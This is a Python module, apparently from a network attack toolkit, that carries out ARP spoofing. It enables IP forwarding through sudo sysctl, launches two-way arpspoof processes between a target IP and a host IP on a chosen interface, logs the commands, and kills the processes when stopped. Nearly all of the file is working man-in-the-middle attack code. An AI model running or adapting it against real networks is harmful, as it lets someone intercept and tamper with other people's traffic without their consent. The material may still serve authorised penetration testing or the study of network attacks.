import subprocess
from scapy.all import Ether, ARP, srp, send
from utils import spoofingutils
import psutil
import signal
import os

global pid
global isOn
pid = list()
isOn = False

def checkForwarding():
    #cat /proc/sys/net/ipv4/ip_forward
    command = ["cat", "/proc/sys/net/ipv4/ip_forward"]
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    output, r = p.communicate(None)
    return str(output)

def enableForwarding():
    # sudo sysctl -w net.ipv4.ip_forward=1
    command = ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"]
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    return p.returncode

def disableForwarding():
    # sudo sysctl -w net.ipv4.ip_forward=1
    command = ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"]
    p = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    return p.returncode

def startSpoofing(target_ip, host_ip, session, interface="wlan0"):
    global isOn
    if isOn:
        session.addLog("ARP Spoofing was already on")
        return -1
    session.addLog("Starting ARP Spoofing")
    isOn = True
    command1 = ["sudo", "arpspoof", "-i", interface, "-t", target_ip, host_ip]
    command2 = ["sudo", "arpspoof", "-i", interface, "-t", host_ip, target_ip]
    session.addLog("Executing command: "+str(command1))
    session.addLog("Executing command: "+str(command2))
    p1 = subprocess.Popen(
        command1,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    #output1, r1 = p1.communicate(None)
    p2 = subprocess.Popen(
        command2,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8"
    )
    #output2, r2 = p2.communicate(None)
    global pid
    pid.append(p1.pid)
    pid.append(p2.pid)

def stopSpoofing():
    global pid
    global isOn
    if not "pid" in globals():
        return -1
    if not pid:
        return -1
    else:
        for pd in pid:
            if psutil.pid_exists(pd):
                os.kill(pd, signal.SIGKILL)
        pid.clear()
        isOn = False
        return 0
    return -1